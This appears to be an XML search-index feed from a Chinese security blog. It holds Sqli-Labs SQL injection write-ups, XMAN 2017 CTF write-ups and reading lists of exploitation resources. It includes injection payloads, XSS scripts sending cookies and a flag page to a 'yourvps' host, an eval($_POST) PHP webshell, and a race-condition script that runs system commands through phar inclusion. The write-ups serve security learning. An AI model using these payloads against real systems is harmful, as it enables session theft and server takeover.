== 1: sys.stdout.write("\r\n") breakexp() 注：脚本中的payload的空格我用%90替代了，它对应tab键，可用于绕过对空格的过滤。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less13~14-writeup]]></title>
      <url>%2F2017%2F08%2F23%2FSqli-Labs-Less13-14-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less-13 POST- Double Injection -Single quotes -String-with twistLess-14 POST- Double Injection -Single quotes -String-with twist Less 13当post数据为：1uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit 报错语句：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos;) LIMIT 0,1&apos; at line 1 说明有括号保护，需闭合。 当post数据为：1uname=admin&apos;)#&amp;passwd=chybeta&amp;submit=Submit 页面返回提示说已经登陆成功。 后台查询语句为:1SELECT username, password FROM users WHERE username=(&apos;admin&apos;)#`&apos;) and password=(&apos;chybeta&apos;) LIMIT 0,1 Less 14当post数据为：1uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit 报错语句为：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot; LIMIT 0,1&apos; at line 1 当post数据为：1uname=admin&amp;passwd=chybeta&quot;&amp;submit=Submit 报错语句为:1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;chybeta&quot;&quot; LIMIT 0,1&apos; at line 1 从以上几条语句知道，需要闭合双引号。 payload：1uname=admin&quot;#&amp;passwd=chybeta&amp;submit=Submit 页面返回提示说已经登陆成功。 后台查询语句为：1SELECT username, password FROM users WHERE username=&quot;admin&quot;#&quot; and password=&quot;chybeta&quot; LIMIT 0,1]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less11~12-writeup]]></title>
      <url>%2F2017%2F08%2F23%2FSqli-Labs-Less11-12-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less-11 POST-Error Based -Single quotes- StringLess-12 POST - Error Based -Double quotes - String考察post注入，所以要借助工具。比如burp。 Less 11当post的数据如下时：1uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit 报错语句为：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos; LIMIT 0,1&apos; at line 1 当post数据如下时：1uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit 报错语句为：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;chybeta&apos;&apos; LIMIT 0,1&apos; at line 1 用如下payload即可登陆成功：1uname=admin&apos;#&amp;passwd=chybeta&amp;submit=Submit 这样后台的语句为:1SELECT username, password FROM users WHERE username=&apos;admin&apos;#&apos; and password=&apos;chybeta&apos; LIMIT 0,1 Less 12和Less 11差不多，将单引号换成双引号。 post数据为：1uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit 报错语句为：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot;) LIMIT 0,1&apos; at line 1 发现有括号保护。 最后的payload：1uname=admin&quot;)#&amp;passwd=chybeta&amp;submit=Submit 后台查询语句为：1SELECT username, password FROM users WHERE username=(&quot;admin&quot;)#&quot;) and password=(&quot;chybeta&quot;) LIMIT 0,1]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less8~10-writeup]]></title>
      <url>%2F2017%2F08%2F23%2FSqli-Labs-Less8-10-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less-8 GET-Blind-Boolean Based- Single QuotesLess-9 GET-Time based - Single QuotesLess-10 GET-Blind-Time based - double quotes Less 8Less-8 GET-Blind-Boolean Based- Single Quotes访问：1http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 1=1 %23 发现有 字符串You are in........... 访问:1http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 2=1 %23 发现字符串消失。因此我们可以利用基于页面的变化来进行盲注。比如以下payload：1234http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database(),1,1))&lt;= 255 )%23http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database() from 1 for 1))&lt;= 255 )%23 即可根据二分法得到数据库名称。 Less 9该关为GET-Time based - Single Quotes。基于时间的盲注访问:1http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(5) %23 1http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(10) %23 可以看到我们的sleep语句被带到了sql数据库中执行。 接下去可以利用sql中的if语句来进行注入，当条件正确则返回1，若不正确则sleep。1http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23 1http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23 之后利用脚本即可获取数据库名称。 Less 10Less-10 GET-Blind-Time based - double quotes这个跟Less 9一样，只是由单引号变为了双引号。 1http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23 1http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23 除了sleep，还有benchmark函数来进行时间盲注。 1BENCHMARK(count,expr) BENCHMARK()函数重复countTimes次执行表达式expr 访问：1http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,benchmark(10000000,md5(&apos;a&apos;)) )%23 访问:1http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,benchmark(10000000,md5(&apos;a&apos;)) )%23]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN夏令营-2017-XSS-writeup]]></title>
      <url>%2F2017%2F08%2F22%2FXMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup%2F</url>
      <content type="text"><![CDATA[xss Task11http://202.112.51.217:33323/ Solution查看csp头：1&quot;default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;&quot; 这里给出一个payload：1234567&lt;script&gt; var head = document.getElementsByTagName(&quot;head&quot;)[0] var n0t = document.createElement(&quot;link&quot;); n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;); n0t.setAttribute(&quot;href&quot;, &quot;http://yourvps/?&quot; + document.cookie); head.appendChild(n0t);&lt;/script&gt; 得到flag：1xman&#123;BeVEn_CSP_you_G37_mY_C00K1e&#125; Task21http://202.112.51.217:43425 Solution没有csp头。但没办法直接得到cookie。 另外有一个flag.php，访问后如下：1only admin can see the flag! 我们先控制admin访问flag.php，之后再发送数据到我们vps上。 payload：1234567&lt;script&gt; var xhr = new XMLHttpRequest(); xhr.open("GET", "http://202.112.51.217:43425/flag.php", false); xhr.send(); a=xhr.responseText; location.href="http://yourvps/?a="+escape(a);&lt;/script&gt; 得到flag：1xman&#123;OH_Y0u_G37_mY_secreT_F14G!&#125; 后记这些夏令营的题目是看到了一份wp，然后直接用nmap把ip的所有端口都扫了一遍：），然后扫出了一些web题：）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN夏令营-2017-比赛系统-writeup]]></title>
      <url>%2F2017%2F08%2F22%2FXMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup%2F</url>
      <content type="text"><![CDATA[逻辑问题、任意用户密码重置 Task1http://202.112.51.217:8013 Solution有登陆和注册的功能，其中登陆处还有忘记密码。结合url：12http://202.112.51.217:8013/logic2_regist.phphttp://202.112.51.217:8013/logic2_login.php 猜测应该是逻辑问题。 我们注册一个账号 对我这个账号而言，其密保问题和答案均为chybeta 接下来看看登陆功能，用刚刚注册的账号登陆，得到提示：1普通用户登录成功,没什么用 那估计要登陆超级用户咯，比如admin。接下来用到忘记密码功能。 我们先输入用户名chybeta， 输入密保答案chybeta 抓包！ 可以看到有个username字段。我们猜测后端忘记密码的流程是这样的，先从数据库中抽取与用户名相对应的密保问题与答案，之后只要判断我们输入的答案是否和密保答案是否一致即可修改密码，而没有再一次的检查用户名。所以可能存在任意用户密码重置漏洞。 修改username为admin，然后forward掉。然后就可以重置admin的密码了。 重置后登陆得到；1FLAG&#123;You_Kookokoko_logic_OK&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN夏令营-2017-babyweb-writeup]]></title>
      <url>%2F2017%2F08%2F22%2FXMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup%2F</url>
      <content type="text"><![CDATA[文件上传、php伪协议、文件包含 Task题目1http://202.112.51.217:8199 Solution一个图片上传功能（submit），还有一个图片查看功能（view）。点击后可发现url是：12http://202.112.51.217:8199/index.php?page=submithttp://202.112.51.217:8199/index.php?page=view 在submit处有上传功能，对应的页面是upload.php。 猜测有包含漏洞，用php伪协议读取源码，其余类似：1http://202.112.51.217:8199/index.php?page=php://filter/read=convert.base64-encode/resource=upload upload.php:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php$error=$_FILES['pic']['error'];$tmpName=$_FILES['pic']['tmp_name'];$name=$_FILES['pic']['name'];$size=$_FILES['pic']['size'];$type=$_FILES['pic']['type'];try&#123; if($name!=="") &#123; $name1=substr($name,-4); if(($name1!==".gif") and ($name1!==".jpg")) &#123; echo "hehe"; echo "&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"; exit; &#125; if($type!=="image/jpeg"&amp;&amp;$type!=="image/gif") &#123; //echo mime_content_type($tmpName); echo "&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"; exit; &#125; if(is_uploaded_file($tmpName))&#123; $time=time(); $rootpath='uploads/'.$time.$name1; if(!move_uploaded_file($tmpName,$rootpath))&#123; echo "&lt;script language='JavaScript'&gt;alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script&gt;"; exit; &#125; else&#123; sleep(2); if ($type=='image/jpeg') &#123; $im = @imagecreatefromjpeg($rootpath); if(!$im)&#123; $im = imagecreatetruecolor(150, 30); $bg = imagecolorallocate($im, 255, 255, 255); $text_color = imagecolorallocate($im, 0, 0, 255); imagefilledrectangle($im, 0, 0, 150, 30, $bg); imagestring($im, 3, 5, 5, "Error loading image", $text_color); &#125; else &#123; $time=time(); $new_rootpath='uploads/'.$time.$name1; imagejpeg($im,$new_rootpath); imagedestroy($im); &#125; &#125; else if ($type=='image/gif') &#123; $im = @imagecreatefromgif($rootpath); if(!$im)&#123; $im = imagecreatetruecolor(150, 30); $bg = imagecolorallocate($im, 255, 255, 255); $text_color = imagecolorallocate($im, 0, 0, 255); imagefilledrectangle($im, 0, 0, 150, 30, $bg); imagestring($im, 3, 5, 5, "Error loading image", $text_color); &#125; else &#123; $time=time(); $new_rootpath='uploads/'.$time.$name1; imagegif($im,$new_rootpath); imagedestroy($im); &#125; &#125; unlink($rootpath); &#125; &#125; echo "图片ID：".$time; &#125;&#125;catch(Exception $e)&#123; echo "ERROR";&#125;?&gt; index.php:1234567891011121314&lt;?php require("header.php"); $page=""; if (isset($_GET['page'])) &#123; $page=strtolower($_GET['page']); $page=str_replace("#", "", $page); $page=str_replace("'", "", $page); $page=$page.".php"; &#125; else $page="main.php"; include($page);?&gt; 在upload.php中，它先将我们上传的文件保存到uploads文件夹下，然后sleep(2)，接着调用imagecreatefromgif等一系列操作。如果我们上传一个包含php代码的图片木马，在经过imagecreatefromgif等一系列操作后，正常情况下其中的php代码会被去掉，也就是说操作过后的图片已经不是图片木马了。不过由于存在sleep(2)，可以利用这个两秒的空隙，利用phar或者zip协议去包含我们上传的还未被删除的图片木马。 基本的流程如下。首先有个k.php，内容如下:1&lt;?php @eval($_POST[&apos;test&apos;]) ?&gt; 将它压缩为zip文件，文件名为k.zip。 然后上传时将其文件名改为k.jpg，类型改为image/jpeg。在上传后访问http://202.112.51.217:8199/uploads/，去获取最新的文件名，然后用协议去包含。如果手动的话时间肯定会超过2s，所以需要用脚本。 123456789101112131415161718192021222324252627282930313233343536373839import requestsimport timeimport threadingimport res = requests.session()def uploadfile(): url = 'http://202.112.51.217:8199/upload.php' data = &#123;'title':'1','url':'1'&#125; files = &#123;'pic': ('k.jpg', open('k.zip', 'rb'), 'image/jpeg', &#123;'Expires': '0'&#125;)&#125; html = s.post(url,files=files)// get the latest filenamedef getfilename(): url = 'http://202.112.51.217:8199/uploads/' content = s.get(url).content reg = r'href="(.+?\.jpg)"' imgre = re.compile(reg) imglist = re.findall(imgre,content) return imglist[::-1] // use phar getshelldef getshell(): filename = getfilename() for i in filename: url = 'http://202.112.51.217:8199/index.php?page=phar://uploads/' + i +'/k' data = &#123;'test':'system("ls");'&#125; content = s.post(url,data=data).content if 'flag' in content: print content exit()for i in range(10): t1 = threading.Thread(target=uploadfile) t2 = threading.Thread(target=getshell) t1.start() t2.start() 之后将getshell里的改为：123data = &#123;&apos;test&apos;:&apos;system(&quot;cat xxxxxxxxxasdasf_flag.php&quot;);&apos;&#125;content = s.post(url,data=data).contentif &apos;&#123;&apos; in content: 因为index.php中对#进行了过滤，所以zip协议用不了。因为zip协议的利用要如下：1http://202.112.51.217:8199/index.php?page=phar://uploads/filename.jpg#k Refference zip或phar协议包含文件 文件包含漏洞小结 PHP伪协议分析与应用 挖洞姿势：特殊的上传技巧，绕过PHP图片转换实现远程代码执行（RCE）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Software-Security-Learning]]></title>
      <url>%2F2017%2F08%2F19%2FSoftware-Security-Learning%2F</url>
      <content type="text"><![CDATA[Software-Security-Learning 学习资料02/17日更新小记： 新收录文章： 浏览器安全 浏览器漏洞 X41-Browser-Security-White-Paper 纯干货：微软漏洞中国第一人黄正——如何用正确姿势挖掘浏览器漏洞（附完整 PPT）｜硬创公开课 Bin Securiy 软件安全工程师技能表 Tools pharos: Automated static analysis tools for binary programs Angr：The next-generation binary analysis platform Angr：一个具有动态符号执行和静态分析的二进制分析工具 angr初探 符号执行：利用Angr进行简单CTF逆向分析 Vuzzer自动漏洞挖掘工具简单分析附使用介绍 PEDA - Python Exploit Development Assistance for GDB pwntools - CTF framework and exploit development library Course Modern Binary Exploitation Linux (x86) Exploit Development Series liveoverflow: Binary Hacking Course Lots of Tutorials Hack The Virtual Memory Hack The Virtual Memory: C strings &amp; /proc Hack The Virtual Memory: Python bytes Hack the Virtual Memory: drawing the VM diagram Hack the Virtual Memory: malloc, the heap &amp; the program break Exploit writing tutorial Stack Based Overflows Stack Based Overflows – jumping to shellcode SEH Based Exploits SEH Based Exploits – just another example From Exploit to Metasploit – The basics How debugger modules &amp; plugins can speed up basic exploit development Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR Unicode – from 0x00410041 to calc Win32 Egg Hunting Introduction to Win32 shellcoding Chaining DEP with ROP Heap Spraying Demystified 基础知识 Linux中的GOT和PLT到底是个啥？ 教练！那根本不是IO！——从printf源码看libc的IO ROP一步一步ROP 一步一步学ROP之linux_x86篇 一步一步学ROP之linux_x86篇 一步一步学ROP之gadgets和2free篇 一步一步学ROP之Android ARM 32位篇 基本ROP Intro to ROP: ROP Emporium — Split ROP Emporium ropasaurusrex: a primer on return-oriented programming2 ROP技术入门教程 二进制漏洞利用中的ROP技术研究与实例分析 现代栈溢出利用技术基础：ROP 通过ELF动态装载构造ROP链 Swing: 基础栈溢出复习 二 之 ROP BROP Blind Return Oriented Programming muhe: Have fun with Blind ROP Swing: 基础栈溢出复习 四 之 BROP SROP Sigreturn Oriented Programming (SROP) Attack攻击原理 Swing: 基础栈溢出复习 三 之 SROP Return-to-dl-resolve 如何在32位系统中使用ROP+Return-to-dl来绕过ASLR+DEP 通过ELF动态装载构造ROP链 （ Return-to-dl-resolve） 栈漏洞 手把手教你栈溢出从入门到放弃（上） 手把手教你栈溢出从入门到放弃（下） Hcamael: PWN学习总结之基础栈溢出 Hcamael: PWN学习总结之基础栈溢出2 Swing: 基础栈溢出复习 之基础 ARM栈溢出攻击实践：从虚拟环境搭建到ROP利用 64-bit Linux stack smashing tutorial: Part 1 64-bit Linux stack smashing tutorial: Part 2 64-bit Linux stack smashing tutorial: Part 3 Offset2lib: bypassing full ASLR on 64bit Linu return2libc学习笔记 堆漏洞 Heap Exploitation how2heap 堆相关知识 PWN之堆内存管理 Linux堆内存管理深入分析（上） Linux堆内存管理深入分析（下） Windows Exploit开发系列教程——堆喷射（一） Windows Exploit开发系列教程——堆喷射（二） Libc堆管理机制及漏洞利用技术 (一） Notes About Heap Overflow Under Linux 如何理解堆和堆溢出漏洞的利用? Have fun with glibc内存管理 内存映射mmap glibc malloc学习笔记之fastbin malloc.c源码阅读之__libc_free Malloc碎碎念 glibc内存分配与回收过程图解 理解 glibc malloc 堆利用技术 how2heap总结-上 how2heap总结-下 溢出科普：heap overflow&amp;溢出保护和绕过 现代化的堆相关漏洞利用技巧 从一字节溢出到任意代码执行-Linux下堆漏洞利用 Heap overflow using unlink 堆溢出的unlink利用方法 Linux堆溢出漏洞利用之unlink 浅析Linux堆溢出之fastbin Linux堆溢出之Fastbin Attack实例详解 unsorted bin attack分析 Double Free浅析 Understanding the heap by breaking it An Introduction to Use After Free Vulnerabilities Use After Free漏洞浅析 Linux堆漏洞之Use after free实例 堆之House of Spirit Dance In Heap（一）：浅析堆的申请释放及相应保护机制 Dance In Heap（二）：一些堆利用的方法（上） Dance In Heap（三）：一些堆利用的方法（中） Dance In Heap（四）：一些堆利用的方法（下） Glibc Adventures：The Forgotten Chunks 格式化字符串漏洞 Exploiting Format String Vulnerabilities 二进制漏洞之——邪恶的printf 漏洞挖掘基础之格式化字符串 格式化字符串漏洞利用小结（一） 格式化字符串漏洞利用小结（二） Linux下的格式化字符串漏洞利用姿势 Linux系统下格式化字符串利用研究 Advances in format string exploitation Exploiting Sudo format string vunerability 其余漏洞FSP溢出 Head First FILE Stream Pointer Overflow abusing the FILE structure File Stream Pointer Overflows Paper. 溢出利用FILE结构体 整数溢出 整数溢出漏洞 保护绕过Cannary绕过 栈溢出之绕过CANARY保护 论canary的几种玩法 Liunx下关于绕过cancry保护总结 内核 Some-Kernel-Fuzzing-Paper Introduction to Windows Kernel Driver Exploitation (Pt. 1) - Environment Setup - Environment Setup) Introduction to Windows Kernel Driver Exploitation (Pt. 2) - Stack Buffer Overflow to System Shell HackSysExtremeVulnerableDriver Starting with Windows Kernel Exploitation – part 1 – setting up the lab Starting with Windows Kernel Exploitation – part 2 – getting familiar with HackSys Extreme Vulnerable Driver 利用WinDbg本地内核调试器攻陷 Windows 内核 Windows内核利用之旅：熟悉HEVD（附视频演示） Windows 内核攻击：栈溢出 Linux 内核漏洞利用教程（一）：环境配置 Linux 内核漏洞利用教程（二）：两个Demo Linux 内核漏洞利用教程（三）：实践 CSAW CTF 题目 Linux内核ROP姿势详解(一) Linux内核ROP姿势详解（二） 虚拟机逃逸 Phrack: VM escape - QEMU Case Study 虚拟机逃逸——QEMU的案例分析（一） 虚拟机逃逸——QEMU的案例分析（二） 虚拟机逃逸——QEMU的案例分析（三） ARM ARM 汇编基础速成1：ARM汇编以及汇编语言基础介绍 ARM 汇编基础速成2：ARM汇编中的数据类型 ARM 汇编基础速成3：ARM模式与THUMB模式 ARM 汇编基础速成4：ARM汇编内存访问相关指令 ARM 汇编基础速成5：连续存取 ARM 汇编基础速成6：条件执行与分支 ARM 汇编基础速成7：栈与函数 Lua Lua程序逆向之Luac文件格式分析 进程注入 10种常见的进程注入技术的总结 系统安全攻防战：DLL注入技术详解 符号执行 关于符号执行 Playing with Dynamic symbolic execution 漏洞挖掘 看我如何对Apache进行模糊测试并挖到了一个价值1500刀的漏洞 CTF中的pwn pwn &amp; exploit 入门 跟我入坑PWN第一章 跟我入坑PWN第二章 技巧 借助DynELF实现无libc的漏洞利用小结 what DynELF does basically Finding Function’s Load Address 总结 CTF总结 pwn tips CTF-pwn-tips pwn 学习总结 CTF中做Linux下漏洞利用的一些心得 linux常见漏洞利用技术实践 WP 堆溢出学习之0CTF 2017 Babyheap 一道有趣的CTF PWN题 Exploit-Exercises Nebula全攻略 三个白帽之从pwn me调试到Linux攻防学习 Android SecurityExercise DIVA Android Android安全项目入门篇 Skill Android应用逆向工程 初探 Android SO 开发 Android App漏洞学习（一） Android App漏洞学习（二） WIKI: Android Android组件安全 通过 WebView 攻击 Android 应用 Tool 走到哪黑到哪——Android渗透测试三板斧 Brida:将frida与burp结合进行移动app渗透测试 浏览器安全 浏览器漏洞 浅谈多浏览器的自动化测试 浏览器漏洞挖掘思路 IE漏洞攻防编年简史 IE浏览器漏洞综合利用技术：UAF利用技术的发展 IE浏览器漏洞综合利用技术：堆喷射技术 cure53-browser-sec-whitepaper X41-Browser-Security-White-Paper 纯干货：微软漏洞中国第一人黄正——如何用正确姿势挖掘浏览器漏洞（附完整 PPT）｜硬创公开课 IOS/OSX Securiy OSX/iOS reverse engineering IOSExercise Damn Vulnerable iOS Application (DVIA) Skill IosHackStudy Papers, Slides and Thesis Archive : iOS ios-wiki: iOS Security apple官方文档：iOS Security iOS安全系列汇总 浅谈iOS应用安全自动化审计 iOS安全审计入门 iOS内核漏洞挖掘–fuzz&amp;代码审计 OSXExercise OS X : Crackmes OS X内核大揭秘之基础篇 OS X内核大揭秘之利用篇 Skill Papers, Slides and Thesis Archive : Mac OS X 实现 macOS 内核监控的几种方法 蓝牙安全 Guide to Bluetooth Security malware Reverse engineering malware: TrickBot (part 1 - packer) Reverse engineering malware: TrickBot (part 2 - loader) Reverse engineering malware: TrickBot (part 3 - core) 《恶意样本分析手册》合辑]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Web-Security-Learning]]></title>
      <url>%2F2017%2F08%2F19%2FWeb-Security-Learning%2F</url>
      <content type="text"><![CDATA[Web-Security-Learning 学习资料01月29日更新： 新收录文章 mysql SSRF To RCE in MySQL MSSQL MSSQL不使用xp_cmdshell执行命令并获取回显的两种方法 postgresql 渗透中利用postgresql getshell 前端安全 严格 CSP 下的几种有趣的思路（34c3 CTF） 从微信小程序看前端代码安全 水坑攻击之Jsonp hijacking-信息劫持 php 2018 PHP 应用程序安全设计指北 java-Web Apache Commons Collections反序列化漏洞学习 redis 【应急响应】redis未授权访问致远程植入挖矿脚本（防御篇） SSTI 服务端模板注入攻击 信息搜集 渗透测试向导之子域名枚举技术 挖洞技巧：信息泄露之总结 渗透 我所了解的内网渗透——内网渗透知识大总结 Web-Security-Learning项目地址：Web-Security-Learning Web Securitysql注入MySql MySQL False注入及技巧总结 MySQL 注入攻击与防御 sql注入学习总结 SQL注入防御与绕过的几种姿势 MySQL偏门技巧 mysql注入可报错时爆表名、字段名、库名 高级SQL注入:混淆和绕过 BypassD盾IIS防火墙SQL注入防御（多姿势） SQL注入：如何通过Python CGIHTTPServer绕过CSRF tokens Mysql约束攻击 Mysql数据库渗透及漏洞利用总结 MySQL绕过WAF实战技巧 NetSPI SQL Injection Wiki SQL注入的“冷门姿势” MSSQL MSSQL DBA权限获取WEBSHELL的过程 MSSQL 注入攻击与防御 CLR在SQL Server中的利用技术分析 MSSQL不使用xp_cmdshell执行命令并获取回显的两种方法 PostgreSQL postgresql数据库利用方式 PostgreSQL渗透测试指南 渗透中利用postgresql getshell MongoDB 十分钟看懂MongoDB攻防实战 MongoDB安全 – PHP注入检测 技巧 我的WafBypass之道（SQL注入篇） Bypass 360主机卫士SQL注入防御 SQL注入之骚姿势小记 CTF比赛中SQL注入的一些经验总结 如何绕过WAF/NGWAF的libinjection实现SQL注入 HackMe-SQL-Injection-Challenges 绕过WAF注入 bypassGET和POST的注入防御思路分享 SQL注入的常规思路及奇葩技巧 Beyond SQLi: Obfuscate and Bypass 工具 sqlmap自带的tamper你了解多少？ 使用burp macros和sqlmap绕过csrf防护进行sql注入 sqlmap 使用总结 SQLmap tamper脚本注释 通过Burp以及自定义的Sqlmap Tamper进行二次SQL注入 前端安全XSS 漫谈同源策略攻防 再谈同源策略 跨域方法总结 浅谈跨站脚本攻击与防御 跨站的艺术-XSS入门与介绍 Content Security Policy 入门教程 LoRexxar-CSP 前端防御从入门到弃坑—CSP变迁 CSP bypass by setting innerHTML on a same-origin page lacking CSP 严格 CSP 下的几种有趣的思路（34c3 CTF） 如何绕过Edge、Chrome和Safari的内容安全策略 XSS小记 DOMXSS Wiki XSS Bypass Cookbook 从瑞士军刀到变形金刚—XSS攻击面拓展 我们要在任何可能的地方测试XSS漏洞 Alternative to Javascript Pseudo-Protocol 妙用JavaScript绕过XSS过滤 Bypassing CSP using polyglot JPEGs Bypass unsafe-inline mode CSP Chrome XSS Auditor – SVG Bypass Cross site scripting payload for fuzzing CRLF Injection and Bypass Tencent WAF XSS Without Dots 不常见的xss利用探索 XSS攻击另类玩法 XSS易容术—-bypass之编码混淆篇+辅助脚本编写 Xssing Web With Unicodes Chrome 是怎么过滤反射型 XSS 的呢？ XSS Tricks - 从 Self-XSS 到登录你的账户 Electron hack —— 跨平台 XSS XSS without HTML: Client-Side Template Injection with AngularJS 一个URL跳转引发的一系列“惨案” 利用反射型XSS二次注入绕过CSP form-action限制 看我如何挖到GoogleMaps XSS漏洞并获得5000刀赏金 利用XSS和CSRF漏洞远程实现PayPal合作方网站未授权账户访问 Story of a Parameter Specific XSS! Modern Alchemy: Turning XSS into RCE 先知XSS挑战赛 - L3m0n Writeup SheepSec: 7 Reflected Cross-site Scripting (XSS) Examples Browser’s XSS Filter Bypass Cheat Sheet CSRF Wiping Out CSRF 用代码来细说Csrf漏洞危害以及防御 Cookie-Form型CSRF防御机制的不足与反思 关于JSON CSRF的一些思考 Exploiting JSON Cross Site Request Forgery (CSRF) using Flash 浅谈Session机制及CSRF攻防 CSRF 花式绕过Referer技巧 各大SRC中的CSRF技巧 白帽子挖洞—跨站请求伪造（CSRF）篇 其他 HTML中，闭合优先的神奇标签 JavaScript Dangerous Functions (Part 1) - HTML Manipulation safari本地文件读取漏洞之扩展攻击面 利用脚本注入漏洞攻击ReactJS应用程序 当代 Web 的 JSON 劫持技巧 从微信小程序看前端代码安全 SSRF SSRF:CVE-2017-9993 FFmpeg + AVI + HLS SSRF（服务器端请求伪造）测试资源 Build Your SSRF Exploit Framework SSRF SSRF攻击实例解析 SSRF漏洞分析与利用 SSRF漏洞的挖掘经验 SSRF漏洞的利用与学习 SSRF漏洞中绕过IP限制的几种方法总结 利用ssrf漏洞获取google内部的dns信息 What is Server Side Request Forgery (SSRF)? Use DNS Rebinding to Bypass SSRF in Java SSRF in JAVA DNS Rebinding技术绕过SSRF/代理IP限制 Discuz ssrf漏洞利用的几个python脚本 Discuz X系列门户文章功能SSRF漏洞挖掘与分析 SSRF to GET SHELL SSRF Tips XXE 浅谈XXE漏洞攻击与防御 XXE漏洞分析 XML实体注入漏洞攻与防 XML实体注入漏洞的利用与学习 XXE注入:攻击与防御 - XXE Injection: Attack and Prevent XXE (XML External Entity Injection) 漏洞实践 黑夜的猎杀-盲打XXE Hunting in the Dark - Blind XXE XMLExternal Entity漏洞培训模块 如何挖掘Uber网站的XXE注入漏洞 XXE被提起时我们会想到什么 XXE漏洞的简单理解和测试 XXE漏洞攻防之我见 XXE漏洞利用的一些技巧 神奇的Content-Type——在JSON中玩转XXE攻击 XXE-DTD Cheat Sheet XML? Be cautious! XSLT Server Side Injection Attacks Java XXE Vulnerability xml-attacks.md JSONP注入 JSONP注入解析 JSONP 安全攻防技术 一次关于JSONP的小实验与总结 利用JSONP跨域获取信息 关于跨域和jsonp的一些理解(新手向) 水坑攻击之Jsonp hijacking-信息劫持 SSTI Jinja2 template injection filter bypasses 乱弹Flask注入 服务端模板注入攻击 （SSTI）之浅析 Exploring SSTI in Flask/Jinja2 Flask Jinja2开发中遇到的的服务端注入问题研究 FlaskJinja2 开发中遇到的的服务端注入问题研究 II Exploring SSTI in Flask/Jinja2, Part II Injecting Flask Server-Side Template Injection: RCE for the modern webapp Exploiting Python Code Injection in Web Applications 利用 Python 特性在 Jinja2 模板中执行任意代码 Python 模板字符串与模板注入 Ruby ERB Template Injection 服务端模板注入攻击 代码执行 / 命令执行 从PHP源码与扩展开发谈PHP任意代码执行与防御 Command Injection/Shell Injection PHP Code Injection Analysis 利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令 Hack PHP mail additional_parameters 详细解析PHP mail()函数漏洞利用技巧 在PHP应用程序开发中不正当使用mail()函数引发的血案 BigTree CMS - Bypass CSRF filter and execute code with PHPMailer 基于时间反馈的RCE 正则表达式使用不当引发的系统命令执行漏洞 命令注入突破长度限制 文件包含 php文件包含漏洞 Turning LFI into RFI PHP文件包含漏洞总结 常见文件包含发生场景与防御 基于云端的本地文件包含漏洞 zip或phar协议包含文件 文件包含漏洞 一 文件包含漏洞 二 文件上传 / 解析漏洞 文件上传和WAF的攻与防 我的WafBypass之道（upload篇） 文件上传漏洞（绕过姿势） 服务器解析漏洞 文件上传总结 文件上传绕过姿势总结 尽最大可能分析上传源码及漏洞利用方式 从XSSer的角度测试上传文件功能 代码审计之逻辑上传漏洞挖掘 渗透测试方法论之文件上传 关于文件名解析的一些探索 Web安全 — 上传漏洞绕过 逻辑漏洞 A couple more common OAuth 2.0 vulnerabilities 代码审计之逻辑上传漏洞挖掘 